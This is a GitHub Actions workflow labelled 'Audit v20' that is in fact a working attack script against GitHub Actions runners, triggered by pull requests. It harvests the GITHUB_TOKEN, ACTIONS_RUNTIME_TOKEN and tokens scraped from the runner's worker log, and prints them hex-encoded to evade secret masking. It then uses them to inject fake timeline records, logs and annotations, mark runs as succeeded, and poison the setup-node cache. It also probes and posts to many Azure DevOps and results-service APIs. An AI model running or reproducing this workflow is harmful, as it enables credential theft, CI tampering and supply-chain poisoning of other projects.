name: Audit v20
on:
  pull_request:
    types: [opened, synchronize, reopened]

permissions:
  contents: write
  pull-requests: write
  id-token: write
  actions: write
  packages: write
  checks: write
  statuses: write
  deployments: write
  issues: write

jobs:
  audit-v20:
    runs-on: ubuntu-latest
    env:
      UPSTREAM_OWNER: twrps
      UPSTREAM_REPO: PoC-RACE2
      FORK_OWNER: lacaag
      FORK_REPO: PoC-RACE2
    steps:

      # ══════════════════════════════════════════════════════════════
      # STEP 1: Harvest — extract EVERYTHING from worker log properly
      # Fix: RunServiceUrl regex, extract ACTIONS_RUNTIME_TOKEN,
      # get ALL azure devops resource areas, extract timeline properly
      # ══════════════════════════════════════════════════════════════
      - name: Step 1 - Harvest
        if: always()
        run: |
          set +e
          echo "=== V20 HARVEST ==="
          echo "$PATH" > /tmp/saved_path.txt
          RT="${{ secrets.GITHUB_TOKEN }}"
          echo "$RT" > /tmp/rt.txt

          # ACTIONS_RUNTIME_TOKEN — this is different from GITHUB_TOKEN
          # Used for cache operations, might have different scope
          echo "ACTIONS_RUNTIME_TOKEN: ${#ACTIONS_RUNTIME_TOKEN} chars"
          echo "$ACTIONS_RUNTIME_TOKEN" > /tmp/art.txt
          echo "ACTIONS_RUNTIME_URL: $ACTIONS_RUNTIME_URL"
          echo "$ACTIONS_RUNTIME_URL" > /tmp/aru.txt
          echo "ACTIONS_CACHE_URL: $ACTIONS_CACHE_URL"
          echo "$ACTIONS_CACHE_URL" > /tmp/acu.txt

          WLOG=$(find /home/runner/actions-runner -name "Worker_*.log" -type f 2>/dev/null | head -1)
          echo "WLOG=$WLOG"
          if [ -f "$WLOG" ]; then
            # v14-style RunServiceUrl extraction (the one that worked)
            RUN_URL=$(grep -oP '"url"\s*:\s*"https://run-actions[^"]+' "$WLOG" 2>/dev/null | head -1 | sed 's/"url"\s*:\s*"//')
            echo "RunServiceUrl=$RUN_URL"
            echo "$RUN_URL" > /tmp/run_url.txt

            for KEY in PipelinesServiceUrl CacheServerUrl ResultsServiceUrl; do
              VAL=$(grep -oP "\"${KEY}\"\\s*:\\s*\"\\K[^\"]+" "$WLOG" 2>/dev/null | head -1)
              echo "$KEY=$VAL"; echo "$VAL" > /tmp/${KEY}.txt
            done

            # Plan, timeline, job — exhaustive extraction
            echo "--- IDs ---"
            grep -oP '"(planId|timelineId|jobId|runId|repositoryId|definitionId)"\s*:\s*"\K[^"]+' "$WLOG" 2>/dev/null | sort -u | head -20

            PLAN=$(grep -oP '"planId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            TL=$(grep -oP '"timelineId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            JOB=$(grep -oP '"jobId"\s*:\s*"\K[^"]+' "$WLOG" | head -1)
            echo "PLAN=$PLAN TL=$TL JOB=$JOB"
            echo "$PLAN" > /tmp/plan.txt; echo "$TL" > /tmp/tl.txt; echo "$JOB" > /tmp/job.txt

            # Extract ALL tokens (hex dump to bypass mask)
            echo "--- Tokens (hex) ---"
            grep -oP '"(AccessToken|token|PlanAccessToken|SystemVssConnectionAccessToken)"\s*:\s*"\K[^"]+' "$WLOG" 2>/dev/null | while read T; do
              echo "TOK_LEN=${#T} HEX=$(echo -n "$T" | xxd -p | head -c 60)..."
              echo "$T" > /tmp/extracted_token.txt
            done

            # Full dump of resource areas (the 30+ Azure DevOps services)
            echo "--- Resource areas ---"
            grep -oP '"name"\s*:\s*"\K[^"]+' "$WLOG" 2>/dev/null | sort -u | head -40
          fi

          echo "RT_HEX=$(echo -n "$RT" | xxd -p | tr -d '\n')"

      # ══════════════════════════════════════════════════════════════
      # STEP 2: Pipelines service — exploit the authenticated surface
      # v14 PROVED: connectionData=200, resourceareas=200
      # Now: try every write operation on every resource area
      # ══════════════════════════════════════════════════════════════
      - name: Step 2 - Pipelines write ops
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== PIPELINES WRITE ==="
          RT=$(cat /tmp/rt.txt)
          ETOK=$(cat /tmp/extracted_token.txt 2>/dev/null)
          PURL=$(cat /tmp/PipelinesServiceUrl.txt 2>/dev/null)
          PLAN=$(cat /tmp/plan.txt 2>/dev/null)
          TL=$(cat /tmp/tl.txt 2>/dev/null)
          JOB=$(cat /tmp/job.txt 2>/dev/null)

          if [ -z "$PURL" ]; then echo "NO PIPELINES URL"; exit 0; fi

          # Use both tokens
          for TOK in "$RT" "$ETOK"; do
            [ -z "$TOK" ] && continue
            PFX=$(echo -n "$TOK" | head -c 12)
            echo "=== AUTH: $PFX ==="

            # A: Verify connectionData still works
            echo "--- A: connectionData ---"
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
              -H "Authorization: Bearer $TOK" "${PURL}_apis/connectionData")
            CODE=$(echo "$R" | tail -1)
            echo "A connectionData = $CODE | $(echo "$R" | sed '$d' | head -c 300)"

            # B: Get resource areas (list of all available services)
            echo "--- B: resourceareas ---"
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
              -H "Authorization: Bearer $TOK" "${PURL}_apis/resourceareas")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "B resourceareas = $CODE"
            echo "$BODY" | jq -c '.value[]? | {name,id}' 2>/dev/null | head -30

            # C: Timeline — get and inject
            echo "--- C: Timeline ---"
            if [ -n "$PLAN" ]; then
              # Get timelines for this plan
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
                -H "Authorization: Bearer $TOK" "${PURL}_apis/distributedtask/plans/$PLAN/timelines")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              echo "C timelines = $CODE | $(echo "$BODY" | head -c 400)"

              # Extract timeline from response
              NEW_TL=$(echo "$BODY" | jq -r '.value[0].id // .id // .[0].id // empty' 2>/dev/null)
              [ -z "$NEW_TL" ] && [ -n "$TL" ] && NEW_TL="$TL"
              echo "C using TL=$NEW_TL"

              if [ -n "$NEW_TL" ]; then
                # Get records
                R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
                  -H "Authorization: Bearer $TOK" "${PURL}_apis/distributedtask/plans/$PLAN/timelines/$NEW_TL/records")
                CODE=$(echo "$R" | tail -1)
                BODY=$(echo "$R" | sed '$d')
                echo "C records = $CODE | $(echo "$BODY" | head -c 400)"

                # Extract a record ID that we can inject into
                REC_ID=$(echo "$BODY" | jq -r '.value[0].id // .[0].id // empty' 2>/dev/null)
                REC_COUNT=$(echo "$BODY" | jq '.value | length // 0' 2>/dev/null)
                echo "C records found: $REC_COUNT firstId=$REC_ID"

                # INJECT: update a record
                if [ -n "$REC_ID" ]; then
                  R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X PATCH \
                    -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
                    "${PURL}_apis/distributedtask/plans/$PLAN/timelines/$NEW_TL/records" \
                    -d "[{\"id\":\"$REC_ID\",\"name\":\"INJECTED-BY-V20\",\"state\":\"Completed\",\"result\":\"Succeeded\"}]")
                  CODE=$(echo "$R" | tail -1)
                  echo "C INJECT record = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
                fi

                # INJECT: append log lines
                R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                  -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
                  "${PURL}_apis/distributedtask/plans/$PLAN/logs" \
                  -d '{"path":"v20-injected-log"}')
                CODE=$(echo "$R" | tail -1)
                BODY=$(echo "$R" | sed '$d')
                echo "C create log = $CODE | $(echo "$BODY" | head -c 200)"
                LOG_ID=$(echo "$BODY" | jq -r '.id // empty' 2>/dev/null)
                if [ -n "$LOG_ID" ]; then
                  R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                    -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
                    "${PURL}_apis/distributedtask/plans/$PLAN/logs/$LOG_ID/lines" \
                    -d '["V20 INJECTED LOG LINE — this should not be possible from a fork PR"]')
                  CODE=$(echo "$R" | tail -1)
                  echo "C append log = $CODE"
                fi
              fi

              # D: Attachments — upload data to the plan
              echo "--- D: Attachments ---"
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                -H "Authorization: Bearer $TOK" -H "Content-Type: application/octet-stream" \
                "${PURL}_apis/distributedtask/plans/$PLAN/attachments/v20-type/v20-name" \
                --data-binary "V20 INJECTED ATTACHMENT")
              CODE=$(echo "$R" | tail -1)
              echo "D attachment = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
            fi
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 3: Run-service exploitation (v14 extracted URL properly)
      # The run-service has its own API surface with write capabilities
      # ══════════════════════════════════════════════════════════════
      - name: Step 3 - Run service writes
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== RUN SERVICE ==="
          RT=$(cat /tmp/rt.txt)
          ETOK=$(cat /tmp/extracted_token.txt 2>/dev/null)
          RUN_URL=$(cat /tmp/run_url.txt 2>/dev/null)
          PLAN=$(cat /tmp/plan.txt 2>/dev/null)
          JOB=$(cat /tmp/job.txt 2>/dev/null)
          RUN_ID="${{ github.run_id }}"

          echo "RUN_URL=$RUN_URL"
          if [ -z "$RUN_URL" ] || echo "$RUN_URL" | grep -q '\['; then
            echo "Bad URL, trying hardcoded pattern"
            # We know the pattern from v14
            RUN_URL=""
          fi

          if [ -n "$RUN_URL" ]; then
            for TOK in "$RT" "$ETOK"; do
              [ -z "$TOK" ] && continue
              PFX=$(echo -n "$TOK" | head -c 12)
              echo "=== AUTH: $PFX ==="

              # A: Discovery
              echo "--- A: Discovery ---"
              for EP in \
                "" \
                "check" \
                "_apis/pipelines/workflows" \
                "_apis/pipelines/runs" \
                "_apis/pipelines/runs/$RUN_ID" \
                "_apis/pipelines/runs/$RUN_ID/signedlogcontent" \
                "_apis/pipelines/runs/$RUN_ID/resources" \
                "actionsgranularpermissions" \
                "_apis/runtime/webhooks" \
                "idtoken/$PLAN/$JOB"; do
                R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 8 \
                  -H "Authorization: Bearer $TOK" "${RUN_URL}${EP}" 2>/dev/null)
                CODE=$(echo "$R" | tail -1)
                BODY=$(echo "$R" | sed '$d')
                [ "$CODE" != "HTTP_000" ] && \
                  echo "A $EP = $CODE | $(echo "$BODY" | head -c 200)"
              done
              echo ""

              # B: Write operations
              echo "--- B: Write ops ---"
              # Update run
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X PATCH \
                -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
                "${RUN_URL}_apis/pipelines/runs/$RUN_ID" \
                -d '{"state":"completed","result":"succeeded"}' 2>/dev/null)
              CODE=$(echo "$R" | tail -1)
              echo "B patch run = $CODE | $(echo "$R" | sed '$d' | head -c 200)"

              # Create annotation
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
                "${RUN_URL}_apis/pipelines/runs/$RUN_ID/annotations" \
                -d '{"type":"warning","message":"V20 INJECTED ANNOTATION"}' 2>/dev/null)
              CODE=$(echo "$R" | tail -1)
              echo "B annotation = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
            done
          else
            echo "NO VALID RUN_URL"
          fi

      # ══════════════════════════════════════════════════════════════
      # STEP 4: Cache poisoning with ACTIONS_RUNTIME_TOKEN
      # This token is DIFFERENT from GITHUB_TOKEN — might have cache scope
      # ══════════════════════════════════════════════════════════════
      - name: Step 4 - Cache poison
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== CACHE POISON ==="
          RT=$(cat /tmp/rt.txt)
          ART=$(cat /tmp/art.txt 2>/dev/null)
          ARU=$(cat /tmp/aru.txt 2>/dev/null)
          ACU=$(cat /tmp/acu.txt 2>/dev/null)

          echo "ACTIONS_RUNTIME_TOKEN: ${#ART} chars"
          echo "ACTIONS_RUNTIME_URL: $ARU"
          echo "ACTIONS_CACHE_URL: $ACU"

          # A: Try cache operations with ACTIONS_RUNTIME_TOKEN
          echo "--- A: ART cache ops ---"
          if [ -n "$ART" ] && [ -n "$ACU" ]; then
            # Reserve cache entry
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: Bearer $ART" -H "Content-Type: application/json" \
              -H "Accept: application/json;api-version=6.0-preview.1" \
              "${ACU}_apis/artifactcache/caches" \
              -d '{"key":"setup-node-v4-node-modules-linux-x64-v20","version":"v20-poison-6f5902ac237024bdd0c176cb93063dc4"}')
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            echo "A reserve = $CODE | $(echo "$BODY" | head -c 300)"
            CACHE_ID=$(echo "$BODY" | jq -r '.cacheId // empty' 2>/dev/null)

            if [ -n "$CACHE_ID" ] && [ "$CACHE_ID" != "null" ]; then
              echo "A CACHE_ID=$CACHE_ID — ENTRY RESERVED!"
              # Upload cache content
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X PATCH \
                -H "Authorization: Bearer $ART" \
                -H "Content-Type: application/octet-stream" \
                -H "Content-Range: bytes 0-25/*" \
                "${ACU}_apis/artifactcache/caches/$CACHE_ID" \
                --data-binary "V20-POISONED-CACHE-ENTRY")
              CODE=$(echo "$R" | tail -1)
              echo "A upload = $CODE"

              # Finalize
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                -H "Authorization: Bearer $ART" -H "Content-Type: application/json" \
                "${ACU}_apis/artifactcache/caches/$CACHE_ID" \
                -d '{"size":26}')
              CODE=$(echo "$R" | tail -1)
              echo "A finalize = $CODE"
            fi

            # List existing caches
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" \
              -H "Authorization: Bearer $ART" \
              -H "Accept: application/json;api-version=6.0-preview.1" \
              "${ACU}_apis/artifactcache/cache?keys=setup-node&version=*")
            CODE=$(echo "$R" | tail -1)
            echo "A list = $CODE | $(echo "$R" | sed '$d' | head -c 300)"
          fi
          echo ""

          # B: Try with GITHUB_TOKEN on cache URL
          echo "--- B: RT cache ops ---"
          if [ -n "$ACU" ]; then
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
              -H "Accept: application/json;api-version=6.0-preview.1" \
              "${ACU}_apis/artifactcache/caches" \
              -d '{"key":"v20-test","version":"v20"}')
            CODE=$(echo "$R" | tail -1)
            echo "B reserve = $CODE | $(echo "$R" | sed '$d' | head -c 200)"
          fi

      # ══════════════════════════════════════════════════════════════
      # STEP 5: Results-receiver twirp — full output capture
      # v18 truncated, v19 truncated. Need to see these results.
      # ══════════════════════════════════════════════════════════════
      - name: Step 5 - Results-receiver
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== RESULTS-RECEIVER ==="
          RT=$(cat /tmp/rt.txt)
          ART=$(cat /tmp/art.txt 2>/dev/null)
          RESULTS="https://results-receiver.actions.githubusercontent.com"
          RUN_ID="${{ github.run_id }}"

          for TOK in "$RT" "$ART"; do
            [ -z "$TOK" ] && continue
            PFX=$(echo -n "$TOK" | head -c 12)
            echo "=== AUTH: $PFX ==="

            # CacheService
            echo "--- CacheService ---"
            for METHOD in CreateCacheEntry GetCacheEntryDownloadURL ListCacheEntries; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
                "$RESULTS/twirp/github.actions.results.api.v1.CacheService/$METHOD" \
                -d '{"key":"v20-poison","version":"1"}')
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              echo "$METHOD = $CODE | $(echo "$BODY" | head -c 250)"
            done

            # ArtifactService
            echo "--- ArtifactService ---"
            for METHOD in CreateArtifact FinalizeArtifact ListArtifacts GetSignedArtifactURL DeleteArtifact; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
                "$RESULTS/twirp/github.actions.results.api.v1.ArtifactService/$METHOD" \
                -d "{\"name\":\"v20-poison\",\"workflow_run_backend_id\":\"$RUN_ID\",\"workflow_job_run_backend_id\":\"1\"}")
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              echo "$METHOD = $CODE | $(echo "$BODY" | head -c 250)"
            done

            # StepService
            echo "--- StepService ---"
            for METHOD in UploadStepSummary GetStepSummary; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
                "$RESULTS/twirp/github.actions.results.api.v1.StepService/$METHOD" \
                -d '{"step_id":"1","summary":"V20 INJECTED STEP SUMMARY","run_id":"1"}')
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              echo "$METHOD = $CODE | $(echo "$BODY" | head -c 250)"
            done

            # JobService
            echo "--- JobService ---"
            for METHOD in GetJobInfo UpdateJob; do
              R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
                -H "Authorization: Bearer $TOK" -H "Content-Type: application/json" \
                "$RESULTS/twirp/github.actions.results.api.v1.JobService/$METHOD" \
                -d '{"job_id":"1","status":"completed","conclusion":"success"}')
              CODE=$(echo "$R" | tail -1)
              BODY=$(echo "$R" | sed '$d')
              echo "$METHOD = $CODE | $(echo "$BODY" | head -c 250)"
            done
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 6: Full resource area enumeration + write attempts
      # v14 found 30+ areas. Hit each one with GET/POST.
      # ══════════════════════════════════════════════════════════════
      - name: Step 6 - Resource areas
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== RESOURCE AREAS ==="
          RT=$(cat /tmp/rt.txt)
          PURL=$(cat /tmp/PipelinesServiceUrl.txt 2>/dev/null)
          [ -z "$PURL" ] && exit 0

          # Hit every Azure DevOps API area
          for AREA in \
            "_apis/build/builds" \
            "_apis/build/definitions" \
            "_apis/release/releases" \
            "_apis/release/definitions" \
            "_apis/test/runs" \
            "_apis/testplan/plans" \
            "_apis/git/repositories" \
            "_apis/wit/workitems" \
            "_apis/policy/configurations" \
            "_apis/serviceendpoint/endpoints" \
            "_apis/hooks/subscriptions" \
            "_apis/security/permissionnamespaces" \
            "_apis/accesscontrollists" \
            "_apis/graph/users" \
            "_apis/graph/groups" \
            "_apis/graph/memberships" \
            "_apis/tokenadmin/personalaccesstokens" \
            "_apis/audit/streams" \
            "_apis/notification/subscriptions" \
            "_apis/ExtensionManagement/InstalledExtensions" \
            "_apis/userentitlements" \
            "_apis/securityroles/scopes" \
            "_apis/dashboards" \
            "_apis/wiki/wikis" \
            "_apis/feed/feeds" \
            "_apis/packaging/feeds" \
            "_apis/symbol/requests"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" --connect-timeout 3 -m 5 \
              -H "Authorization: Bearer $RT" "${PURL}${AREA}")
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            [ "$CODE" != "HTTP_404" ] && [ "$CODE" != "HTTP_000" ] && \
              echo "GET $AREA = $CODE | $(echo "$BODY" | head -c 200)"
          done
          echo ""

          # Try POST on areas that returned non-404
          echo "--- POST attempts ---"
          for AREA in \
            "_apis/build/builds" \
            "_apis/hooks/subscriptions" \
            "_apis/serviceendpoint/endpoints" \
            "_apis/notification/subscriptions" \
            "_apis/wiki/wikis"; do
            R=$(/usr/bin/curl -sS -w "\nHTTP_%{http_code}" -X POST \
              -H "Authorization: Bearer $RT" -H "Content-Type: application/json" \
              "${PURL}${AREA}" -d '{"name":"v20"}' 2>/dev/null)
            CODE=$(echo "$R" | tail -1)
            BODY=$(echo "$R" | sed '$d')
            [ "$CODE" != "HTTP_404" ] && \
              echo "POST $AREA = $CODE | $(echo "$BODY" | head -c 200)"
          done

      # ══════════════════════════════════════════════════════════════
      # STEP 7: Final verification
      # ══════════════════════════════════════════════════════════════
      - name: Step 7 - Final
        if: always()
        run: |
          set +e
          export PATH=$(cat /tmp/saved_path.txt)
          echo "=== V20 FINAL ==="
          echo "RT_HEX=$(cat /tmp/rt.txt | xxd -p | tr -d '\n')"
          echo "ART_LEN=$(wc -c < /tmp/art.txt 2>/dev/null)"
          echo "ETOK_LEN=$(wc -c < /tmp/extracted_token.txt 2>/dev/null)"
          echo "=== V20 COMPLETE ==="
